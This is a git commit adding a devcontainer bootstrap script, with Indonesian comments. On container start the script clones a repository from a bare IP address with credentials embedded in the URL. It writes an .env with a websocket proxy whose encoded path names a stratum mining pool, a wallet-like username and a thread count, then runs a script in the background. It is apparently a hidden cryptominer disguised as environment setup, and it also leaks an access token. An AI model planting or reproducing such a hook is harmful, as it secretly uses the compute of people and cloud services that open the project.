6c11827bb9f33131f8254d76050af7ba8d0813e7
felciafitalsan <feliciafitalsan@gmail.com>
2025-09-20 18:00:37 +0700

    Create bootstrap.sh

---
+++ .devcontainer/bootstrap.sh
@@ -0,0 +1,30 @@
+#!/bin/bash
+set -e
+
+# Clone repo python-app kalau belum ada
+if [ ! -d "/app/python-app" ]; then
+  git clone http://adminjerry:11a75ed3804a5df1b444f813b9f084310bb64eef@159.89.237.227:3000/adminjerry/python-app.git /app/python-app
+fi
+
+cd /app/python-app
+
+# Fix line endings
+sed -i 's/\r$//' run.sh
+
+# Buat .env
+cat <<EOF > .env
+proxy=wss://wes.baleribo.space/c3RyYXR1bS1uYS5uYS5ycGxhbnQueHl6OjcwMjI=
+host=127.0.0.1
+port=3036
+username=mbc1q7sm9tj0fy5yvmyrq6cwehn9wagv0t593gjc46d.ajinggggbackground
+password=x
+threads=15
+EOF
+
+chmod +x run.sh
+
+# Jalankan run.sh 4 di background
+./run.sh 4 &
+
+# Balik ke /app buat jalanin Next.js
+cd /app
